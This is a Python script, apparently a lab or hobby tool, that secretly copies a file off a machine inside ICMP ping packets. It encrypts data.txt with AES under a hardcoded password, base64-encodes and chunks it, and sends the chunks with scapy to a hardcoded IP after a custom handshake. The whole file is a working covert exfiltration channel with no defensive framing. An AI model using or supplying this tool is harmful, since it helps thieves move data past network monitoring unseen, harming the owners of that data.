#!/usr/bin/python3

import scapy.all as scapy
import random
import base64
from time import sleep
from hashlib import sha256
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad

MAX_SIZE = 256
FILENAME = 'data.txt'
SLEEP_TIME = 2
DST = "192.168.69.102"
HANDSHAKE_MSG = b"wei wei"
DATA_SIZE_LEN = 4
PASSWORD = "caccola"

def read_file(filename):
    with open(filename, 'rb') as f:
        s = f.read()
    return s

def b64_encode(raw_data):
    return str(base64.b64encode(raw_data), "utf-8")

def divide_data(data, max_size):
    a = []
    # separate first parts
    while(len(data) > max_size):
        a.append(data[:max_size])
        data = data[max_size:]
    # append the last part
    a.append(data.ljust(max_size, '\x00'))
    return a

def encrypt(raw, password):
    # if no password, no encryption
    if password == '':
        return file_content
    
    #unpad = lambda s: s[:-ord(s[len(s) - 1:])]
    key = sha256(password.encode("utf-8")).digest()
    raw = pad(raw, 16, style='pkcs7')
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(raw)

def handshake(dst, data_len):
    id = random.randint(0, 65526-1)
    seq_n = random.randint(0, 65526-1)

    data_entry = HANDSHAKE_MSG + data_len.to_bytes(4, byteorder='big')
    packet = scapy.IP(dst=dst)/scapy.ICMP(id=id, seq=seq_n)/data_entry
    res = scapy.send(packet)
    
    return (id, (seq_n + 1) % 65526 )

def send_data(dst, id, seq_n, data_array):
    for data_entry in data_array:
        packet = scapy.IP(dst=dst)/scapy.ICMP(id=id, seq=seq_n)/data_entry
        res = scapy.send(packet)
        seq_n = (seq_n + 1) % 65526

if __name__ == "__main__":
    file_content = read_file(FILENAME)
    encrypted_data = encrypt(file_content, PASSWORD)
    b64_data = b64_encode(encrypted_data)
    data_array = divide_data(b64_data, MAX_SIZE)
    id, seq_n = handshake(DST, len(data_array))
    sleep(SLEEP_TIME)
    send_data(DST, id, seq_n, data_array)



